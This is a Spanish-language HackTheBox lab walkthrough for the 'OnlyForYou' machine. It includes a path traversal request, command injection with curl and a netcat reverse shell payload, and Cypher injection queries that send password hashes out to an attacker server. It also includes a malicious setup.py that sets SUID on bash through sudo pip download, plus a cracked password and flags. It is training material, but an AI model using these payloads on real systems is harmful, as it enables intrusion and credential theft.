---
title: OnlyForYou HTB
date: 2023-04-26
tier: medium
author: naibu3
---

INCOMPLETE

## Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.11.210
```
```nmap
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A continuación tratamos de detectar servicios y versiones:

```bash
nmap -sVC -p22,80  10.10.11.210
```
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos reporta que se está aplicando una redirección, por lo que añadimos dicho dominio al `/etc/hosts`. Si volvemos a ejecutar [[nmap]], no obtenemos mucha info. extra.

Nos vamos ahora a tratar de enumerar la web, con [[whatweb]]:

```bash
whatweb http://only4you.htb/
```
```whatweb
http://only4you.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@only4you.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], Lightbox, Script, Title[Only4you], nginx[1.18.0]
```

Tenemos una sección de *contacto*, donde podemos enviar un mensaje y suscribirnos a una *newsletter*. Antes de comenzar a probar, dejaremos en segundo plano a [[dirb 1]] en busca de posibles rutas:

```bash
dirb http://only4you.htb/ /usr/share/wordlists/dirb/common.txt
```

SIn embargo, no parece haber nada y *dirb* no reporta ninguna ruta. Podemos intentar buscar subdominios con [[gobuster]]:

```bash
gobuster vhost -u http://only4you.htb/ -w /usr/share/wordlists/dirb/common.txt -t 10 --append-domain
```
```gobuster
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://only4you.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dirb/common.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/27 19:39:19 Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.only4you.htb Status: 200 [Size: 2191]
Progress: 4598 / 4615 (99.63%)
===============================================================
2023/04/27 19:40:12 Finished
===============================================================
```

Si accedemos al subdominio `beta.only4you.htb` (añadelo al */etc/hosts*), veremos que podemos descargar el código fuente de la página. Si analizamos el fichero `app.py`, veremos todas las posibles rutas a las que podemos acceder. Nos llama la atención las dos posibles subidas de archivos, sin embargo, están bien sanitizadas.

Por otro lado, la parte de la descarga no realiza tales comprobaciones. Si haciendo uso de [[burpsuite]] capturamos la petición y cambiamos el parámetro *image* por */etc/passwd*(`image=/etc/passwd`), obtenemos la siguiente respuesta:

```http
root:x:0:0:root:/root:/bin/bash
[...]
john:x:1000:1000:john:/home/john:/bin/bash
[...]
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
[...]
```

Donde vemos varios usuarios potenciales. Además, accediendo a ver el `/etc/nginx/sites-enabled/default` podemos ver la ruta de los dos *VHOSTS*: 

```ǹginx
server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

Podemos tratar de acceder a la *webroot* del host principal y listar archivos que conocemos gracias al *backup* que descargamos antes, por ejemplo el `app.py`:

```python
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')
[...]
```

Vemos una extraña, `form`, probamos a listarla con `image=/var/www/only4you.htb/form.py`. Y descubrimos que es un archivo:

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
[...]
```

Vemos que en la asignación de la variable `result` se está utilizando la función `run()`. A la que se le pasa el parámetro `email` que llega en la propia petición. Por tanto podemos volver a interceptar una petición y editarla con [[burpsuite]] para inyectar comandos en [[Bash]]:

```http
POST / HTTP/1.1
Host: only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://only4you.htb
Connection: close
Referer: http://only4you.htb/
Upgrade-Insecure-Requests: 1

name=dsfds&email=hola%40hola.com;curl 10.10.16.65:30303&subject=hola&message=hola
```

En este caso, probamos a hacer una petición a un servidor http con [[python 1]] (`sudo python3 -m http.server 30303`). Recibimos la respuesta, así que confirmamos que es vulnerable a [[RCE]].

## Explotación

Vamos a tratar de entablarnos una reverse shell ([[Reverse shell]]). Para ello nos podremos en escucha con [[netcat]]:

```bash
nc -lvnp 30303
```

E inyectaremos la reverse shell (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`) en la petición con [[burpsuite]]:

```http
name=asdas&email=hola%40hola.hola;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.54+39393+>/tmp/f&subject=hola%40hola.hola&message=asdasda
```

Y deberíamos obtener una shell como **www-data**. A continuación aplicamos un [[Tratamiento de la tty]], y procederemos con el [[Reconocimiento del equipo]].

## Escalada de privilegios (User)

No parece haber ningún archivo interesante, sin embargo, si tratamos de enumerar puertos con [[netstat]]:

```bash
netstat -t
```
```netstat
[...]
tcp        0      0 localhost:8001          localhost:59528         TIME_WAIT  
tcp        0      0 localhost:46930         localhost:7687          TIME_WAIT
[...]
```

Vemos dos puertos abiertos que solo son accesibles desde la propia máquina, así que aplicamos [[eJPT-Notes/port forwarding]]. Para ello utilizaremos [[chisel 1]]:

```bash
./chisel server -p 8000 --reverse
```
> En nuestra máquina.

```bash
./chisel client 10.10.14.54:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 &
```
> En la máquina víctima.

Podemos volver a lanzar [[nmap]] para escanear los puertos:

```bash
nmap -sCV -p8001,3000 localhost
```
```nmap
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=6c6713318c67582e; Path=/; HttpOnly
|     Set-Cookie: _csrf=KsvaG2IXLLiKd-Qx3L0sOsSvwT86MTY4OTQ0MzUwMDI2OTMwODIwNA; Path=/; Domain=127.0.0.1; Expires=Sun, 16 Jul 2023 17:51:40 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Sat, 15 Jul 2023 17:51:40 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="KsvaG2IXLLiKd-Qx3L0sOsSvwT86MTY4OTQ0MzUwMDI2OTMwO
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     X-Content-Type-Options: nosniff
|     Date: Sat, 15 Jul 2023 17:51:45 GMT
|     Content-Length: 108
|_    template: base/footer:15:47: executing "base/footer" at <.PageStartTime>: invalid value; expected time.Time
8001/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-title: Login
|_Requested resource was /login
```

Si accedemos por el puerto **3000** vemos un servicio **Gogs**, y por el **8001**, un panel de login de una web interna. Si probamos las credenciales **`admin:admin`**, conseguiremos acceder a un dashboard.

En la sección **employees** veremos un mensaje de una lista de tareas que dice "*Migrated to a new database(neo4j)*", lo que nos da la pista de que se está utilizando la base de datos **neo4j**.

Si hacemos una búsqueda por internet encontraremos que este tipo de BD suele ser sensible a [[Cypher Injection 1]]:

> Cypher Injection is a way for maliciously formatted input to jump out of its context, and by altering the query itself, hijack the query and perform unexpected operations on the database.
> This is a cousin to SQL injection, but affects our Cypher query language.Cypher Injection is a way for maliciously formatted input to jump out of its context, and by altering the query itself, hijack the query and perform unexpected operations on the database.

En [hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j), podemos encontrar un listado con posibles inyecciones. Por ejemplo montando un servidor http con [python] y ejecutando la siguiente podemos extraer info. de las versiones:

```sql
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```
```python
10.10.11.210 - - [16/Jul/2023 11:00:39] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```

Vamos a tratar de enumerar los *lables* de la base de datos con la siguiente query:

```sql
'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.54/?label='+label as l RETURN 0 as _0 //
```
```python
10.10.11.210 - - [16/Jul/2023 11:16:30] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:31] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:31] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:31] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:32] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:32] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:33] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:33] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:34] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:16:34] "GET /?label=employee HTTP/1.1" 200 -
```

Vemos una etiqueta **user**, vamos a tratar de listarla:

```sql
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.54/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
```sql
10.10.11.210 - - [16/Jul/2023 11:18:19] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:20] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:20] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:21] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:21] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:22] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:22] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:23] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:23] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:23] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:24] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:24] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:25] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:25] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:25] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:26] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:26] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:27] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:27] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Jul/2023 11:18:27] "GET /?username=john HTTP/1.1" 200 -
```

Ahora tenemos contraseñas hasheadas, podemos tratar de romper la de **john** con [[hashcat 1]] o mediante alguna página como [hashes.com](https://hashes.com/en/decrypt/hash). Si lo hacemos vemos que la contraseña es:

```hash
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
```

Y ya podemos acceder por [[22-ssh]]. Y podemos leer la **flag de ususario** (`1459c8da1c8e0d603ade5a0a53e3ed5c`).

## Escalada de privilegios(root)

Si enumeramos los archivos que podemos ejecutar como **sudo**:

```bash
sudo -l
```
```sudo -l
User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Vemos que podemos descargar un archivo con extensión *tar.gz*, que se encuentre en el servicio **gogs** que vimos antes, mediante **pip download**. Si buscamos por internet encontraremos que mediante dicho comando podemos llegar a ejecutar un comando (enlace al [artículo](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)). Lo primero es crear el script que se ejecutará, que cambiará los permisos de la [[Bash]]:

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod u+s /bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

A continuación lo covertimos en un paquete:

```bash
python3 -m build
```

Ya solo queda crear un nuevo repo en el gogs y subir el .tar.gz que debe encontrarse en *.dist/*. Finalmente ejecutamos el siguiente comando con sudo:

```bash
sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/exploit/src/master/this_is_fine_wuzzi-0.0.1.tar.gz
```

Y ya tenemos privilegios SUID en la [[Bash]]:

```bash
bash -p
```

Y solo queda ver el *root.txt* (`ddd6fbe43104c5b6d0ecbeaa5f35222e`). Y ya habríamos acabado la máquina!